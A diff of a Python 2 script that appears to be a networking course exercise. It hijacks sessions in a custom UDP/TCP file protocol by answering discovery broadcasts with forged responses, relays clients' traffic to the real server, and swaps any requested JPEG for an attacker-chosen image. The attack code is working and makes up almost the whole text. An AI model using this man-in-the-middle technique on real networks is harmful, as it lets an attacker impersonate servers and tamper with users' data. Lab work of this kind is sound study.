@@ -9,13 +9,11 @@ import sys
 #implement bonus?
 #check protocol : split sends? and 1/0 for Dir/File
 
-#forum questions:
-#location of hijack root
-#protect ourselvs from dir traversal?
-#if a non existant jpg is requested, do we return real jpg?
 
 
-UDP_IP = "192.168.146.139"
+
+BUFFER_SIZE = 1024*128 #128KB
+UDP_IP = socket.gethostbyname(socket.gethostname())
 UDP_PORT = 1337
 udpSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
 udpSock.bind((UDP_IP, UDP_PORT))
@@ -35,7 +33,7 @@ GetFileResp = '\xde\xaf\x04'
 
 udp_init_start = '\xde\xaf\x01'
 mysid = sys.argv[1]
-print 'hijacking sid:',mysid
+#print 'hijacking sid:',mysid
 mysid = int(mysid)
 myport = 31337
 udp_resp_header = '\xde\xaf\x02'
@@ -66,7 +64,7 @@ def udpQuery():
 	data = struct.pack('!3si',udp_init_start,mysid)
 	clientUdpSock.sendto(data,("255.255.255.255",1337))
 	
-	data,addr = clientUdpSock.recvfrom(1024)
+	data,addr = clientUdpSock.recvfrom(BUFFER_SIZE)
 	format = '!3sihI'
 	header,sid,realPort,crc = struct.unpack(format,data)
 	
@@ -75,7 +73,7 @@ def udpQuery():
 		print "wat"
 		return
 	
-	print "real addr",addr	
+	#print "real addr",addr	
 	return (addr[0],realPort)
 	
 def udpIdentify(data,addr):
@@ -93,7 +91,7 @@ def udpIdentify(data,addr):
 	crc = (sid ^ 0xCAFEBABE) + 4 * (myport ^ 0x652)
 	data = struct.pack(format,udp_resp_header,mysid,myport,crc)
 	udpSock.sendto(data,addr)
-	print "hijacked ",addr 
+	#print "hijacked ",addr 
 
 def SendFile(path):
 	p = os.path.join(base,path)
@@ -108,48 +106,54 @@ def SendFile(path):
 	#print data
 	return GetFileResp+data , fdata
 
-  
+
 while True:
 	
-	data, addr = udpSock.recvfrom(1024)
+	data, addr = udpSock.recvfrom(BUFFER_SIZE)
 	#hijack session
 	udpIdentify(data,addr)
 	#get real data
 	
 	clientUdpSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
-	clientTcpSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	clientTcpSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP
 	
 	clientUdpSock.bind((UDP_IP,1338))
 	clientUdpSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 	clientUdpSock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)	
 	rAddr = udpQuery()
-	udpSock.recvfrom(1024) #get our own UDP packet out of the stack.
+	udpSock.recvfrom(BUFFER_SIZE) #get our own UDP packet out of the stack.
 	clientUdpSock.close()
 	
 	tcpSock.listen(1)
 	conn, addr = tcpSock.accept()
-	data = conn.recv(1024)
+	data = conn.recv(BUFFER_SIZE)
 	#validate data
 	header ,b, dlen = struct.unpack('!2sbh',data[:5])
 	path = struct.unpack('!{0}s'.format(dlen),data[5:])[0]
-	if path.endswith('jpg') and b == GetFileReq:
+
+	#connect to real server
+	clientTcpSock.connect(rAddr)
+	#send data
+	clientTcpSock.send(data)
+	#get the real data
+	rData = clientTcpSock.recv(BUFFER_SIZE)
+	#send it back.
+	
+	if path.endswith('jpg') and b == GetFileReq and rData > 0:
 		head,data = SendFile("pic.jpg")
 		conn.send(head)
 		conn.send(data)
 	else:
-		#connect to real server
-		clientTcpSock.connect(rAddr)
-		#send data
-		clientTcpSock.send(data)
-		#get the real data
-		rData = clientTcpSock.recv(1024)
-		#send it back.
+		header,dataLeft = struct.unpack('!3si',rData[:7])
 		sent = conn.send(rData)
-		print "got:",len(rData),"sent:",sent
-		rData = clientTcpSock.recv(1024*1000*10) #10 MB
-		sent = conn.send(rData)		
-		print "got:",len(rData),"sent:",sent
-	print 'mischief managed'
+		rData = ''
+		
+		while dataLeft > 0:
+			#print dataLeft 
+			tmp = clientTcpSock.recv(BUFFER_SIZE)
+			rData += tmp
+			dataLeft -= len(tmp)
+		sent = conn.send(rData)
 	
 	conn.close()
 	clientTcpSock.close()
